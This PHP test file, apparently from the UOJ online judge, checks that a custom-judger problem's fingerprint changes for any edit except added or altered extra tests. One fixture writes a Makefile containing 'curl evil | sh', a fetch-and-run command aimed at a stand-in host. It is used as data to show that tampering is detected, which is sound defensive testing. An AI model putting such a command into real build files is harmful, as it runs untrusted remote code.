<?php

require_once __DIR__ . '/../app/libs/uoj-validate-lib.php';
require_once __DIR__ . '/../app/libs/uoj-judger-lib.php';
require_once __DIR__ . '/../app/libs/uoj-data-lib.php';

// builds an upload folder of a problem with a custom judger and returns its fingerprint
function fingerprint_of($files, $conf) {
	$dir = sys_get_temp_dir() . '/uoj_fingerprint_test_' . getmypid();
	exec('rm -rf ' . escapeshellarg($dir));
	mkdir("$dir/require", 0755, true);
	foreach ($files as $name => $content) {
		file_put_contents("$dir/$name", $content);
	}
	$fingerprint = dataCustomJudgerFingerprint($dir, $conf);
	exec('rm -rf ' . escapeshellarg($dir));
	return $fingerprint;
}

$files = [
	'problem.conf' => "use_builtin_judger off\n",
	'Makefile' => "all: judger std val\n",
	'judger.cpp' => "int main() {}\n",
	'std.cpp' => "int main() {}\n",
	'require/lib.h' => "// lib\n",
	'input1.txt' => "1 2\n",
	'output1.txt' => "3\n",
	'ex_input1.txt' => "2 3\n",
	'ex_output1.txt' => "5\n",
];
$conf = ['use_builtin_judger' => 'off', 'n_tests' => '1', 'n_ex_tests' => '1', 'time_limit' => '1'];
$approved = fingerprint_of($files, $conf);

check_same(64, strlen($approved), 'the fingerprint is a SHA256');
check_same($approved, fingerprint_of($files, $conf), 'the fingerprint is stable');
check_same($approved, fingerprint_of($files, array_reverse($conf, true)), 'the order of problem.conf does not matter');

// what a successful hack does: one more extra test
$hacked = $files + ['ex_input2.txt' => "\x00\xff\r\n", 'ex_output2.txt' => "9\n"];
$hacked_conf = ['n_ex_tests' => 2] + $conf;
check_same($approved, fingerprint_of($hacked, $hacked_conf), 'a new extra test keeps the fingerprint');
check_same($approved, fingerprint_of(['ex_input1.txt' => "7 7\n"] + $files, $conf), 'the content of an extra test does not matter');

// everything else has to be approved again
$changed = function($files, $conf) use ($approved) {
	return fingerprint_of($files, $conf) !== $approved;
};
check_same(true, $changed(['Makefile' => "all:\n\tcurl evil | sh\n"] + $files, $conf), 'a changed Makefile');
check_same(true, $changed(['judger.cpp' => "int main() { return 1; }\n"] + $files, $conf), 'a changed judger');
check_same(true, $changed(['require/lib.h' => "// evil\n"] + $files, $conf), 'a changed file in a subfolder');
check_same(true, $changed(['input1.txt' => "5 5\n"] + $files, $conf), 'a changed main test');
check_same(true, $changed($files + ['helper.sh' => "#!/bin/sh\n"], $conf), 'a new file');
check_same(true, $changed($files + ['ex_input2.txt' => "1\n"], $conf), 'a file named like an extra test that is not one');
check_same(true, $changed($files, ['time_limit' => '100'] + $conf), 'a changed limit');
check_same(true, $changed($files, $conf + ['input_suf' => 'cpp']), 'a changed file name pattern');
check_same(true, $changed(array_diff_key($files, ['std.cpp' => 0]), $conf), 'a removed file');
